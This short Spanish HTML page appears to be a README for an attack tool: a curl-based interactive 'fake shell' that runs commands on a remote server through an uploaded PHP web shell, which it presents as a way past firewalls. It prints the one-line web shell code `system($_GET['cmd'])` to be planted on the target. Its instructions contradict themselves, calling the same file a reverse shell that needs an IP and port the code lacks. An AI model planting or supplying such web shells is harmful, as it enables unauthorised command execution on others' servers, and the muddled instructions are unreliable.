<!DOCTYPE html>
<html>
<body>
	<h1>Shell Interactivo con curl</h1>
	<p>Este script de shell interactivo envía comandos al servidor HTTP remoto a través de una URL que incluye el comando como parámetro de consulta y muestra la salida resultante en la terminal local. El script utiliza la utilidad curl para realizar solicitudes GET a la URL especificada. Es útil cuando un firewall no nos permite entablarnos una conexión por TCP con el equipo remoto.</p>
	<h2>Uso</h2>
	<p>Para utilizar este script, simplemente descargue el archivo "shell.sh" y ejecute el siguiente comando:</p>
	<pre><code>./shell.sh</code></pre>
	<p>Asegúrese de cambiar la dirección IP del servidor remoto en la URL de la línea 10.</p>
	<p>El script abrirá un shell interactivo. Simplemente ingrese los comandos que desea ejecutar en el servidor remoto.</p>
	<p>A continuación se muestra un ejemplo de un pequeño script en php que habría que subir al servidor para que funcione nuestra fake web shell:</p>
	<pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
	<p>Este archivo PHP puede cargar en el servidor remoto para establecer una conexión de shell inversa con el atacante. El archivo se puede ejecutar desde la línea de comandos usando el siguiente comando:</p>
	<pre><code>php reverse_shell.php</code></pre>
	<p>Asegúrese de cambiar la dirección IP y el puerto en el archivo PHP antes de cargarlo en el servidor remoto.</p>
</body>
</html>
